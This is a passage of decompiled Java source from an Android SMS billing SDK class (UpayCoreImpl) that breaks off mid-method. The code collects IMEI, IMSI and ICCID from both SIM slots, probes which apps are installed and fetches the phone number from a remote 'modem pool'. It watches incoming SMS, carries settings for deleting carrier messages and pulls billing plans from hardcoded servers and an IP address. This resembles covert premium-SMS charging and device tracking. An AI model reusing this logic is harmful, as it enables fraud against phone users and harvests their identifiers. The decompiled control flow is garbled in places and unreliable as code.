package com.upay.billing.engine;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.upay.billing.Engine;
import com.upay.billing.MtContext;
import com.upay.billing.UpayActivity;
import com.upay.billing.UpayConstant;
import com.upay.billing.UpayContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Action;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Cooldown;
import com.upay.billing.bean.Goods;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Plan;
import com.upay.billing.bean.PriceType;
import com.upay.billing.bean.Trade;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.NativeUtil;
import com.upay.billing.utils.Util;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collection;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Random;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.TreeMap;
import java.util.TreeSet;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPOutputStream;
import org.json.JSONObject;

@SuppressLint({"UseSparseArrays"})
public class UpayCoreImpl
  extends UpayCore
{
  private static final String DATA_COLLECTION_TYPE = "data_collection";
  private static final String[] DOMAINS = { "api.upay360.cn", "upayapi.piiwan.com", "upayapi.upwan.cn", "115.28.225.12" };
  private static int Date_Limit = 163;
  public static final String EVENT_PUSH_INSTALLED = "push_installed";
  private static int Fast_Pay = 0;
  private static final String MODEM_POOL_LOG_URL = "http://api.upay360.cn/function/modem_pool/log.jsp";
  private static final String PUSH_BASE_URL = "http://down.upay360.cn/stat?";
  private static final String SAVE_NAME = "com.upay.billing.saveddata.Main";
  private static final String TAG = "UpayCoreImpl";
  private static final String UPAY_CALLBACK_ACTION = "com.upay.billing.UpayCallback";
  private static final String VERIFY_URL = "http://&domain/function/ping.jsp";
  public static HashMap<String, Integer> cmdType = new HashMap();
  private static final String gzip = "?gzip=1";
  private static int maxSessionId;
  private static HashMap<String, HashMap<String, Integer>> paymentHistory;
  private static final Random rand = new Random(System.currentTimeMillis());
  private static Comparator<Integer> reverseSorter = new UpayCoreImpl.15();
  private static Comparator<int[]> uniqueFilter = new UpayCoreImpl.16();
  private HashMap<String, Action> actions = new HashMap();
  private TreeMap<String, MtContext> activatedHandlers = new TreeMap(new UpayCoreImpl.1(this));
  private String appSecret;
  private String appkey;
  private String areaKey = "32000";
  private long buildDate;
  private String channelKey;
  private HashMap<String, HashMap<Integer, int[][]>> composes = new HashMap();
  private HashMap<String, Cooldown> cooldowns = new HashMap();
  private int count = 10;
  private Trade currentTrade = null;
  private HashMap<String, ArrayList<Json>> customs = new HashMap();
  private List<Integer> deletePush = new ArrayList();
  private HashMap<String, Engine> engines = null;
  private HashMap<String, ArrayList<Json>> events = new HashMap();
  private Handler handler = null;
  private HashMap<String, String> img = new HashMap();
  private Timer initTimer = null;
  private BroadcastReceiver installedReceiver;
  private String lastReceivedSms = null;
  private HashMap<String, Plan> plans = new HashMap();
  private HashMap<String, Trade> pollingTrades = new HashMap();
  private Json properties = Json.parse("{}");
  private HashMap<String, HashMap<Integer, Json>> push = new HashMap();
  private Timer pushTimer = null;
  private TimerTask pushTimerTask = null;
  private HashMap<Integer, String> sessions = new HashMap();
  private List<Long> shieldUser = new ArrayList();
  private SmsObserver smsObserver = null;
  private SmsReceiver smsReceiver = null;
  private Timer timer = null;
  private UpayContext ucontext;
  private boolean updataPackFlag;
  private Json user = Json.parse("{}");
  
  static
  {
    maxSessionId = 1;
    paymentHistory = new HashMap();
    Fast_Pay = 162;
  }
  
  public UpayCoreImpl() {}
  
  public static boolean appInstalled(Context paramContext, String paramString)
  {
    boolean bool = false;
    try
    {
      paramContext = paramContext.getPackageManager().getPackageInfo(paramString, 0);
      if (paramContext != null) {
        bool = true;
      }
      return bool;
    }
    catch (PackageManager.NameNotFoundException paramContext) {}
    return false;
  }
  
  @SuppressLint({"SimpleDateFormat"})
  private int compareDate(String paramString1, String paramString2)
  {
    SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyy-MM-dd");
    try
    {
      paramString1 = localSimpleDateFormat.parse(paramString1);
      paramString2 = localSimpleDateFormat.parse(paramString2);
      if (paramString1.getTime() > paramString2.getTime()) {
        return -1;
      }
      long l1 = paramString1.getTime();
      long l2 = paramString2.getTime();
      if (l1 < l2) {
        return 1;
      }
    }
    catch (Exception paramString1) {}
    return 0;
  }
  
  private ArrayList<Cmd> findCmds(Plan paramPlan, int paramInt, HashSet<String> paramHashSet, int[][] paramArrayOfInt)
  {
    HashMap localHashMap = paramPlan.cmds;
    Pattern localPattern = paramPlan.excludeCmdKeys;
    Op localOp = this.ucontext.op;
    boolean bool1 = this.ucontext.hasSms();
    boolean bool2 = this.ucontext.hasNetwork();
    boolean bool3 = this.ucontext.is3G();
    boolean bool4 = this.ucontext.hasMobileNo();
    TreeSet localTreeSet = new TreeSet(new UpayCoreImpl.WeightSorter(paramInt));
    int j = paramArrayOfInt.length;
    paramInt = 0;
    if (paramInt < j)
    {
      int[] arrayOfInt1 = paramArrayOfInt[paramInt];
      int k = arrayOfInt1.length;
      int[] arrayOfInt2 = new int[k];
      label104:
      label213:
      label298:
      label549:
      do
      {
        Cmd[] arrayOfCmd;
        int i;
        HashSet localHashSet;
        Cmd localCmd;
        do
        {
          arrayOfCmd = new Cmd[k];
          i = 0;
          for (;;)
          {
            if (i >= k) {
              break label213;
            }
            paramPlan = (ArrayList)localHashMap.get(Integer.valueOf(arrayOfInt1[i]));
            if ((paramPlan == null) || ((i == 0) && (arrayOfInt2[0] >= paramPlan.size())))
            {
              paramInt += 1;
              break;
            }
            if (arrayOfInt2[i] >= paramPlan.size())
            {
              int m = i - 1;
              arrayOfInt2[m] += 1;
              arrayOfInt2[i] = 0;
              break label104;
            }
            i += 1;
          }
          i = 0;
          while (i < k)
          {
            arrayOfCmd[i] = ((Cmd)((ArrayList)localHashMap.get(Integer.valueOf(arrayOfInt1[i]))).get(arrayOfInt2[i]));
            i += 1;
          }
          i = k - 1;
          arrayOfInt2[i] += 1;
          localHashSet = new HashSet(6);
          paramPlan = null;
          i = 0;
          if (i >= k) {
            break label549;
          }
          localCmd = arrayOfCmd[i];
        } while (localPattern.matcher(localCmd.key).find());
        if (paramPlan == null) {
          paramPlan = localCmd.btKey;
        }
        for (;;)
        {
          Engine localEngine = (Engine)this.engines.get(paramPlan);
          String str = Util.ifEmpty(localCmd.cdKey, null);
          if ((localEngine == null) || (((k > 1) || (i > 0)) && ((!localEngine.isComposable()) || (paramHashSet.contains(paramPlan)) || ((str != null) && (((Cooldown)this.cooldowns.get(str)).cooling())) || ((str != null) && (localHashSet.contains(str))) || (!inQuota(localCmd, localCmd.price)) || (!localEngine.isAvailable(localOp, bool1, bool2, bool3, bool4))))) {
            break;
          }
          if (str != null) {
            localHashSet.add(str);
          }
          i += 1;
          break label298;
          if ((!paramPlan.equals(localCmd.btKey)) && (((!paramPlan.contains("upay")) && (!paramPlan.contains("dt_sms"))) || ((!localCmd.btKey.contains("upay")) && (!localCmd.btKey.contains("dt_sms"))))) {
            break;
          }
        }
        localTreeSet.add(arrayOfCmd);
      } while (localTreeSet.size() < 100);
    }
    if (localTreeSet.size() > 0) {
      return new ArrayList(Arrays.asList((Object[])localTreeSet.first()));
    }
    return null;
  }
  
  private ArrayList<Engine> findEngines(int paramInt, Pattern paramPattern, HashSet<String> paramHashSet)
  {
    ArrayList localArrayList = new ArrayList();
    Op localOp = this.ucontext.op;
    boolean bool1 = this.ucontext.hasSms();
    boolean bool2 = this.ucontext.hasNetwork();
    boolean bool3 = this.ucontext.is3G();
    boolean bool4 = this.ucontext.hasMobileNo();
    Iterator localIterator = this.engines.values().iterator();
    while (localIterator.hasNext())
    {
      Engine localEngine = (Engine)localIterator.next();
      if ((localEngine.getPriceType() == PriceType.ANY) && (!paramPattern.matcher(localEngine.key).find()) && (!paramHashSet.contains(localEngine.key)) && (localEngine.isAvailable(localOp, bool1, bool2, bool3, bool4))) {
        localArrayList.add(localEngine);
      }
    }
    return localArrayList;
  }
  
  public static byte[] gZip(byte[] paramArrayOfByte)
  {
    try
    {
      ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
      GZIPOutputStream localGZIPOutputStream = new GZIPOutputStream(localByteArrayOutputStream);
      localGZIPOutputStream.write(paramArrayOfByte);
      localGZIPOutputStream.finish();
      localGZIPOutputStream.close();
      paramArrayOfByte = localByteArrayOutputStream.toByteArray();
      localException1.printStackTrace();
    }
    catch (Exception localException1)
    {
      try
      {
        localByteArrayOutputStream.close();
        return paramArrayOfByte;
      }
      catch (Exception localException2)
      {
        for (;;) {}
      }
      localException1 = localException1;
      paramArrayOfByte = null;
    }
    return paramArrayOfByte;
  }
  
  private HashMap<Integer, int[][]> getComposeSchemes(Plan paramPlan)
  {
    Object localObject2 = (HashMap)this.composes.get(paramPlan.appKey);
    Object localObject1 = localObject2;
    if (localObject2 == null)
    {
      Object localObject3 = new HashMap();
      Object localObject4 = paramPlan.cmds.values().iterator();
      Object localObject5;
      Object localObject6;
      while (((Iterator)localObject4).hasNext())
      {
        localObject5 = ((ArrayList)((Iterator)localObject4).next()).iterator();
        while (((Iterator)localObject5).hasNext())
        {
          localObject6 = (Cmd)((Iterator)localObject5).next();
          if ((((Cmd)localObject6).priceType == PriceType.FIXED) && (!paramPlan.excludeCmdKeys.matcher(((Cmd)localObject6).key).find()))
          {
            localObject2 = (HashSet)((HashMap)localObject3).get(((Cmd)localObject6).btKey);
            localObject1 = localObject2;
            if (localObject2 == null)
            {
              localObject2 = ((Cmd)localObject6).btKey;
              localObject1 = new HashSet();
              ((HashMap)localObject3).put(localObject2, localObject1);
            }
            ((HashSet)localObject1).add(Integer.valueOf(((Cmd)localObject6).price));
          }
        }
      }
      localObject2 = new HashMap();
      localObject1 = ((HashMap)localObject3).entrySet().iterator();
      while (((Iterator)localObject1).hasNext())
      {
        localObject3 = (Map.Entry)((Iterator)localObject1).next();
        localObject4 = (String)((Map.Entry)localObject3).getKey();
        localObject3 = new ArrayList((HashSet)((Map.Entry)localObject3).getValue());
        Collections.sort((List)localObject3, reverseSorter);
        localObject5 = ((ArrayList)localObject3).iterator();
        while (((Iterator)localObject5).hasNext())
        {
          localObject6 = (Integer)((Iterator)localObject5).next();
          mapSetAdd((HashMap)localObject2, ((Integer)localObject6).intValue(), new int[] { ((Integer)localObject6).intValue() });
        }
        localObject4 = (Engine)this.engines.get(localObject4);
        if ((localObject4 != null) && (((Engine)localObject4).isComposable()))
        {
          localObject5 = new ArrayList();
          int i = 0;
          int n = ((ArrayList)localObject3).size();
          int j;
          int m;
          int k;
          while (i < n)
          {
            j = i;
            while (j < n)
            {
              m = 0;
              localObject4 = merge(((Integer)((ArrayList)localObject3).get(i)).intValue(), new int[] { ((Integer)((ArrayList)localObject3).get(j)).intValue() });
              ((ArrayList)localObject5).add(localObject4);
              int i1 = localObject4.length;
              k = 0;
              while (k < i1)
              {
                m += localObject4[k];
                k += 1;
              }
              mapSetAdd((HashMap)localObject2, m, (int[])localObject4);
              j += 1;
            }
            i += 1;
          }
          localObject4 = new ArrayList();
          localObject6 = ((ArrayList)localObject3).iterator();
          Object localObject7;
          while (((Iterator)localObject6).hasNext())
          {
            k = ((Integer)((Iterator)localObject6).next()).intValue();
            localObject7 = ((ArrayList)localObject5).iterator();
            while (((Iterator)localObject7).hasNext())
            {
              int[] arrayOfInt = (int[])((Iterator)localObject7).next();
              if (k >= arrayOfInt[0])
              {
                j = 0;
                arrayOfInt = merge(k, arrayOfInt);
                ((ArrayList)localObject4).add(arrayOfInt);
                m = arrayOfInt.length;
                i = 0;
                while (i < m)
                {
                  j += arrayOfInt[i];
                  i += 1;
                }
                mapSetAdd((HashMap)localObject2, j, arrayOfInt);
              }
            }
          }
          localObject5 = new ArrayList();
          localObject3 = ((ArrayList)localObject3).iterator();
          while (((Iterator)localObject3).hasNext())
          {
            k = ((Integer)((Iterator)localObject3).next()).intValue();
            localObject6 = ((ArrayList)localObject4).iterator();
            while (((Iterator)localObject6).hasNext())
            {
              localObject7 = (int[])((Iterator)localObject6).next();
              if (k >= localObject7[0])
              {
                j = 0;
                localObject7 = merge(k, (int[])localObject7);
                ((ArrayList)localObject5).add(localObject7);
                m = localObject7.length;
                i = 0;
                while (i < m)
                {
                  j += localObject7[i];
                  i += 1;
                }
                mapSetAdd((HashMap)localObject2, j, (int[])localObject7);
              }
            }
          }
        }
      }
      localObject1 = new HashMap();
      localObject3 = ((HashMap)localObject2).keySet().iterator();
      while (((Iterator)localObject3).hasNext())
      {
        localObject4 = (Integer)((Iterator)localObject3).next();
        ((HashMap)localObject1).put(localObject4, ((TreeSet)((HashMap)localObject2).get(localObject4)).toArray(new int[0][]));
      }
      this.composes.put(paramPlan.appKey, localObject1);
    }
    return localObject1;
  }
  
  @SuppressLint({"SimpleDateFormat"})
  public static String getFormatedDateTime(long paramLong)
  {
    return new SimpleDateFormat("yyyy-MM-dd").format(new Date(0L + paramLong));
  }
  
  public static void getPhoneNumber(Context paramContext)
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)paramContext.getSystemService("phone");
    Util.addTask(new UpayCoreImpl.22(UpayConstant.API_BASE_URL + "user/modempool_get", localTelephonyManager, paramContext));
  }
  
  private void getPushMessage(String paramString1, String paramString2)
  {
    new UpayCoreImpl.17(this, paramString1, paramString2, Long.valueOf(getPropString("common", "push_polling_time", "1200000")).longValue()).start();
  }
  
  private static final Json getSubTradeBySn(Trade paramTrade, String paramString)
  {
    paramTrade = Util.safeIter(paramTrade.subTrades).iterator();
    while (paramTrade.hasNext())
    {
      Json localJson = (Json)paramTrade.next();
      if (paramString.equals(localJson.getStr("sn"))) {
        return localJson;
      }
    }
    return null;
  }
  
  private final String getTradeId()
  {
    long l1 = this.user.getLong("id");
    int i = rand.nextInt(9000);
    long l2 = Util.getTs();
    long l3 = Util.getLong(getContext(), "Time-Diff");
    return Util.formatDate("yyMMddHH", new Date(l2 + l3)) + Util.zeroPad(Long.valueOf(l1 % 10000L), 4) + (i + 1000);
  }
  
  private static final int getWeight(Cmd paramCmd)
  {
    try
    {
      int i = ((Integer)Cmd.class.getField("weight").get(paramCmd)).intValue();
      return i;
    }
    catch (Exception paramCmd) {}
    return 100;
  }
  
  private boolean inQuota(Cmd paramCmd, int paramInt)
  {
    HashMap localHashMap = (HashMap)paymentHistory.get(paramCmd.key);
    if (localHashMap == null) {
      return true;
    }
    Object localObject1 = new Date();
    Object localObject2;
    if (paramCmd.dayQuota < Integer.MAX_VALUE)
    {
      localObject2 = (Integer)localHashMap.get(Util.formatDate("yyMMdd", (Date)localObject1));
      if ((localObject2 != null) && (((Integer)localObject2).intValue() + paramInt > paramCmd.dayQuota)) {}
    }
    else
    {
      int i;
      if (paramCmd.monthQuota < Integer.MAX_VALUE)
      {
        localObject1 = Util.formatDate("yyMM", (Date)localObject1);
        localObject2 = localHashMap.keySet().iterator();
        i = 0;
        if (((Iterator)localObject2).hasNext())
        {
          String str = (String)((Iterator)localObject2).next();
          if (!str.startsWith((String)localObject1)) {
            break label175;
          }
          i = ((Integer)localHashMap.get(str)).intValue() + i;
        }
      }
      label175:
      for (;;)
      {
        break;
        if (i + paramInt > paramCmd.monthQuota) {
          break label178;
        }
        return true;
      }
    }
    label178:
    return false;
  }
  
  private void initEngines()
  {
    if (this.engines == null)
    {
      this.engines = new HashMap();
      Iterator localIterator = Json.parse((String)Util.invokeGetter(Util.createInstance(this.context, "com.upay.billing.engine.PackageData"), "getEnginesJson")).iterator();
      while (localIterator.hasNext())
      {
        Json localJson = (Json)localIterator.next();
        try
        {
          Engine localEngine = (Engine)Util.createInstance(this.context, localJson.getStr("class"));
          String str = localJson.getStr("key");
          localEngine.init(this, str, localJson.getStr("args"));
          this.engines.put(str, localEngine);
        }
        catch (Exception localException)
        {
          localException.printStackTrace();
        }
      }
    }
  }
  
  private void loadPlan(String paramString1, String paramString2, String paramString3, long paramLong)
  {
    Object localObject = (Plan)this.plans.get(paramString1);
    long l = Long.valueOf(getPropString("common", "request_planlist_time", "300000")).longValue();
    if ((localObject == null) || (System.currentTimeMillis() - ((Plan)localObject).lastUpdate > l))
    {
      Util.saveString(this.context, "cp_key", "");
      localObject = this.ucontext.getParamMap(paramString1, paramString3);
      ((HashMap)localObject).put("app_secret", paramString2);
      ((HashMap)localObject).put("package_name", this.context.getPackageName());
      ((HashMap)localObject).put("app_name", getApplicationName());
      String str = NativeUtil.genHash((HashMap)localObject);
      ((HashMap)localObject).remove("app_secret");
      ((HashMap)localObject).put("hash", str);
      localObject = Util.stringToBytes(Util.mapToJson((HashMap)localObject).asObject().toString());
      Util.addTask(new UpayCoreImpl.13(this, UpayConstant.API_BASE_URL + "plan/list_e" + "?gzip=1", paramString1, paramString2, paramString3, paramLong).setPostData((byte[])localObject).addHeader("Content-Type", "application/json"));
      return;
    }
    this.updataPackFlag = true;
    initCompleted(paramString1, 200, "");
  }
  
  public static final void mapSetAdd(HashMap<Integer, TreeSet<int[]>> paramHashMap, int paramInt, int[] paramArrayOfInt)
  {
    TreeSet localTreeSet2 = (TreeSet)paramHashMap.get(Integer.valueOf(paramInt));
    TreeSet localTreeSet1 = localTreeSet2;
    if (localTreeSet2 == null)
    {
      localTreeSet1 = new TreeSet(uniqueFilter);
      paramHashMap.put(Integer.valueOf(paramInt), localTreeSet1);
    }
    localTreeSet1.add(paramArrayOfInt);
  }
  
  private static final int[] merge(int paramInt, int... paramVarArgs)
  {
    int i = 0;
    int[] arrayOfInt = new int[paramVarArgs.length + 1];
    arrayOfInt[0] = paramInt;
    paramInt = i;
    while (paramInt < paramVarArgs.length)
    {
      arrayOfInt[(paramInt + 1)] = paramVarArgs[paramInt];
      paramInt += 1;
    }
    return arrayOfInt;
  }
  
  private String register()
  {
    String str1 = UpayCore.getInstance(this.context).getUpayContext().imei;
    String str2 = UpayCore.getInstance(this.context).getUpayContext().imsi;
    if ((Util.getString(UpayCore.getInstance(this.context).getContext(), "imeis") != null) && (!Util.getString(UpayCore.getInstance(this.context).getContext(), "imeis").equals("")) && (str1.equals(Util.getString(UpayCore.getInstance(this.context).getContext(), "imeis"))) && (Util.getString(UpayCore.getInstance(this.context).getContext(), "imsis") != null) && (!Util.getString(UpayCore.getInstance(this.context).getContext(), "imsis").equals("")) && (str2.equals(Util.getString(UpayCore.getInstance(this.context).getContext(), "imsis"))) && (Util.getString(UpayCore.getInstance(this.context).getContext(), "sid1") != null) && (!Util.getString(UpayCore.getInstance(this.context).getContext(), "sid1").equals("")) && (Util.getString(UpayCore.getInstance(this.context).getContext(), "key") != null) && (!Util.getString(UpayCore.getInstance(this.context).getContext(), "key").equals("")) && (Util.getString(UpayCore.getInstance(this.context).getContext(), "randNum1") != null) && (!Util.getString(UpayCore.getInstance(this.context).getContext(), "randNum1").equals(""))) {
      return "1";
    }
    return "0";
  }
  
  private void restoreData()
  {
    Object localObject = this.context.getSharedPreferences("com.upay.billing.saveddata.Main", 0);
    String str = Util.ifEmpty(((TelephonyManager)this.context.getSystemService("phone")).getSubscriberId(), "");
    if (!str.equals(Util.getString(this.context, "imsi").trim()))
    {
      SharedPreferences.Editor localEditor = ((SharedPreferences)localObject).edit();
      localEditor.remove("plans");
      localEditor.remove("user");
      localEditor.remove("areaKey");
      localEditor.commit();
      Util.saveString(this.context, "imsi", str);
    }
    try
    {
      str = ((SharedPreferences)localObject).getString("actions", null);
      if (str != null) {
        this.actions = ((HashMap)Util.unserialize(str));
      }
      str = ((SharedPreferences)localObject).getString("cooldowns", null);
      if (str != null) {
        this.cooldowns = ((HashMap)Util.unserialize(str));
      }
      str = ((SharedPreferences)localObject).getString("paymentHistory", null);
      if (str != null) {
        paymentHistory = (HashMap)Util.unserialize(str);
      }
      str = ((SharedPreferences)localObject).getString("events", null);
      if (str != null) {
        this.events = ((HashMap)Util.unserialize(str));
      }
      str = ((SharedPreferences)localObject).getString("customs", null);
      if (str != null) {
        this.customs = ((HashMap)Util.unserialize(str));
      }
      str = ((SharedPreferences)localObject).getString("push", null);
      if (str != null) {
        this.push = ((HashMap)Util.unserialize(str));
      }
      str = ((SharedPreferences)localObject).getString("shieldUser", null);
      if (str != null) {
        this.shieldUser = ((List)Util.unserialize(str));
      }
      localObject = ((SharedPreferences)localObject).getString("img", null);
      if (localObject != null) {
        this.img = ((HashMap)Util.unserialize((String)localObject));
      }
    }
    catch (Exception localException1)
    {
      for (;;) {}
    }
    if (new File(UpayConstant.UPAY_PROP_PATH).exists()) {
      this.properties = Json.parse(Util.loadLocalText(UpayConstant.UPAY_PROP_PATH));
    }
    while (!Util.assetExist(this.context, "upay_properties.json"))
    {
      return;
      try
      {
        str = ((SharedPreferences)localObject).getString("plans", null);
        if (str != null) {
          this.plans = ((HashMap)Util.unserialize(str));
        }
        str = ((SharedPreferences)localObject).getString("user", null);
        if (str != null) {
          this.user = ((Json)Util.unserialize(str));
        }
      }
      catch (Exception localException2)
      {
        for (;;) {}
      }
      str = ((SharedPreferences)localObject).getString("areaKey", null);
      if (str == null) {
        break;
      }
      this.areaKey = str;
      break;
    }
    this.properties = Json.parse(Util.loadAssetsText(this.context, "upay_properties.json"));
  }
  
  private void saveData()
  {
    SharedPreferences.Editor localEditor = this.context.getSharedPreferences("com.upay.billing.saveddata.Main", 0).edit();
    localEditor.putString("plans", Util.serialize(this.plans));
    localEditor.putString("actions", Util.serialize(this.actions));
    localEditor.putString("cooldowns", Util.serialize(this.cooldowns));
    localEditor.putString("paymentHistory", Util.serialize(paymentHistory));
    localEditor.putString("events", Util.serialize(this.events));
    localEditor.putString("customs", Util.serialize(this.customs));
    localEditor.putString("push", Util.serialize(this.push));
    localEditor.putString("img", Util.serialize(this.img));
    localEditor.putString("user", Util.serialize(this.user));
    localEditor.putString("shieldUser", Util.serialize(this.shieldUser));
    localEditor.putString("areaKey", this.areaKey);
    localEditor.commit();
  }
  
  private void updateAction(String paramString, Json paramJson)
  {
    Action localAction2 = (Action)this.actions.get(paramString);
    Action localAction1 = localAction2;
    if (localAction2 == null)
    {
      localAction1 = new Action(paramString);
      this.actions.put(paramString, localAction1);
    }
    localAction1.update(paramJson);
  }
  
  private void updateEngines(int paramInt, String paramString)
  {
    Util.addTask(new UpayCoreImpl.14(this, "http://cdn.upay360.cn/upay_properties.json", paramInt, paramString));
  }
  
  public static void updatePaymentHistory(Trade paramTrade, String paramString)
  {
    if (paramString.startsWith("sn:")) {}
    for (paramTrade = getSubTradeBySn(paramTrade, paramString.substring(3));; paramTrade = paramTrade.getSubTrade(paramString))
    {
      paramString = Util.formatDate("yyMMdd", new Date());
      int i = ((Integer)Util.mapMapGet(paymentHistory, paramTrade.getStr("cmd_key"), paramString, Integer.valueOf(0))).intValue();
      Util.mapMapAdd(paymentHistory, paramTrade.getStr("cmd_key"), paramString, Integer.valueOf(i + paramTrade.getInt("price")));
      return;
    }
  }
  
  private boolean verifyCondition(String paramString1, String paramString2)
  {
    boolean bool = false;
    try
    {
      paramString2 = getPropString("common", paramString2, "");
      if (!Util.empty(paramString2)) {
        bool = Pattern.compile(paramString2).matcher(paramString1).find();
      }
      return bool;
    }
    catch (Exception paramString1) {}
    return false;
  }
  
  private boolean verifyDomain(String paramString)
  {
    boolean[] arrayOfBoolean = new boolean[1];
    arrayOfBoolean[0] = false;
    new UpayCoreImpl.21(this, "http://&domain/function/ping.jsp".replace("&domain", paramString), arrayOfBoolean).run();
    return arrayOfBoolean[0];
  }
  
  public void activateHandlers(Trade paramTrade, String paramString1, String paramString2, Cmd paramCmd)
  {
    Plan localPlan = (Plan)this.plans.get(paramTrade.appKey);
    HashMap localHashMap = paramCmd.actions;
    Iterator localIterator = localHashMap.keySet().iterator();
    while (localIterator.hasNext())
    {
      String str = (String)localIterator.next();
      MtContext localMtContext = new MtContext(paramTrade, paramString1, paramString2, paramCmd, localPlan.deleteMt, str, (ArrayList)localHashMap.get(str));
      synchronized (this.activatedHandlers)
      {
        this.activatedHandlers.put(str, localMtContext);
      }
    }
  }
  
  public boolean fastPay(long paramLong)
  {
    try
    {
      long l1 = System.currentTimeMillis();
      if (!this.shieldUser.contains(Long.valueOf(paramLong)))
      {
        long l2 = Util.getLong(this.context, String.valueOf(paramLong));
        if ((l2 != 0L) && (l1 - l2 < Long.valueOf(getPropString("common", "fast_pay_time", "10000")).longValue())) {
          this.shieldUser.add(Long.valueOf(paramLong));
        }
        Util.saveLong(this.context, String.valueOf(paramLong), l1);
        return false;
      }
      return true;
    }
    catch (Exception localException) {}
    return false;
  }
  
  public Action getAction(String paramString)
  {
    return (Action)this.actions.get(paramString);
  }
  
  public List<Json> getApp(Context paramContext, String paramString)
  {
    ArrayList localArrayList = new ArrayList();
    HashMap localHashMap = new HashMap();
    paramString = getPropString("app_package", paramString, "");
    if (!Util.empty(paramString))
    {
      paramString = paramString.split("&");
      int i = 0;
      while (i < paramString.length)
      {
        String str = paramString[i];
        if (DataCollection.isInstallApp(paramContext, str))
        {
          localHashMap.put("package_name", str);
          localHashMap.put("version_code", DataCollection.getAppVersion(paramContext, str));
          localArrayList.add(Util.mapToJson(localHashMap));
        }
        i += 1;
      }
    }
    return localArrayList;
  }
  
  public String getApplicationName()
  {
    Object localObject2 = null;
    try
    {
      localPackageManager = this.context.getApplicationContext().getPackageManager();
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException1)
    {
      for (;;)
      {
        PackageManager localPackageManager;
        ApplicationInfo localApplicationInfo;
        label28:
        Object localObject1 = null;
      }
    }
    try
    {
      localApplicationInfo = localPackageManager.getApplicationInfo(this.context.getPackageName(), 0);
      localObject2 = localApplicationInfo;
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException2)
    {
      break label28;
    }
    return (String)localPackageManager.getApplicationLabel(localObject2);
  }
  
  public String getAreaKey()
  {
    return this.areaKey;
  }
  
  public Context getContext()
  {
    return this.context;
  }
  
  public Cooldown getCooldown(String paramString)
  {
    return (Cooldown)this.cooldowns.get(paramString);
  }
  
  public Trade getCurrentTrade()
  {
    return this.currentTrade;
  }
  
  public Goods getGoods(String paramString1, String paramString2)
  {
    paramString1 = getPlan(paramString1);
    if ((paramString1 != null) && (paramString1.goods != null)) {
      return (Goods)paramString1.goods.get(paramString2);
    }
    return null;
  }
  
  public List<Json> getMap(Context paramContext)
  {
    String str2 = null;
    String str3 = null;
    ArrayList localArrayList = new ArrayList();
    String str1;
    if (DataCollection.isDoubleTelephone(paramContext))
    {
      if ((DataCollection.getImsi_MTK(paramContext, 0) != null) && (!DataCollection.getImsi_MTK(paramContext, 0).equals("")))
      {
        localObject1 = DataCollection.getImsi_MTK(paramContext, 0);
        if ((DataCollection.getImsi_MTK(paramContext, 1) == null) || (DataCollection.getImsi_MTK(paramContext, 1).equals(""))) {
          break label311;
        }
        str1 = DataCollection.getImsi_MTK(paramContext, 1);
        label78:
        if ((DataCollection.getIccid_MTK(paramContext, 0) == null) || (DataCollection.getIccid_MTK(paramContext, 0).equals(""))) {
          break label409;
        }
        str2 = DataCollection.getIccid_MTK(paramContext, 0);
        label107:
        if ((DataCollection.getIccid_MTK(paramContext, 1) == null) || (DataCollection.getIccid_MTK(paramContext, 1).equals(""))) {
          break label479;
        }
        localObject2 = DataCollection.getIccid_MTK(paramContext, 1);
      }
      for (;;)
      {
        paramContext = new HashMap();
        paramContext.put("imsi", localObject1);
        paramContext.put("iccid", str2);
        localObject1 = new HashMap();
        ((HashMap)localObject1).put("imsi", str1);
        ((HashMap)localObject1).put("iccid", localObject2);
        localArrayList.add(Util.mapToJson(paramContext));
        localArrayList.add(Util.mapToJson((HashMap)localObject1));
        return localArrayList;
        if ((DataCollection.getImsi_GT(paramContext, 0) != null) && (!DataCollection.getImsi_GT(paramContext, 0).equals("")))
        {
          localObject1 = DataCollection.getImsi_GT(paramContext, 0);
          break;
        }
        if ((DataCollection.getImsi_ZX(paramContext, 0) != null) && (!DataCollection.getImsi_ZX(paramContext, 0).equals("")))
        {
          localObject1 = DataCollection.getImsi_ZX(paramContext, 0);
          break;
        }
        if ((DataCollection.getImsi_MIUI(paramContext, 0) != null) && (!DataCollection.getImsi_MIUI(paramContext, 0).equals("")))
        {
          localObject1 = DataCollection.getImsi_MIUI(paramContext, 0);
          break;
        }
        localObject1 = null;
        break;
        label311:
        if ((DataCollection.getImsi_GT(paramContext, 1) != null) && (!DataCollection.getImsi_GT(paramContext, 1).equals("")))
        {
          str1 = DataCollection.getImsi_GT(paramContext, 1);
          break label78;
        }
        if ((DataCollection.getImsi_ZX(paramContext, 1) != null) && (!DataCollection.getImsi_ZX(paramContext, 1).equals("")))
        {
          str1 = DataCollection.getImsi_ZX(paramContext, 1);
          break label78;
        }
        if ((DataCollection.getImsi_MIUI(paramContext, 1) != null) && (!DataCollection.getImsi_MIUI(paramContext, 1).equals("")))
        {
          str1 = DataCollection.getImsi_MIUI(paramContext, 1);
          break label78;
        }
        str1 = null;
        break label78;
        label409:
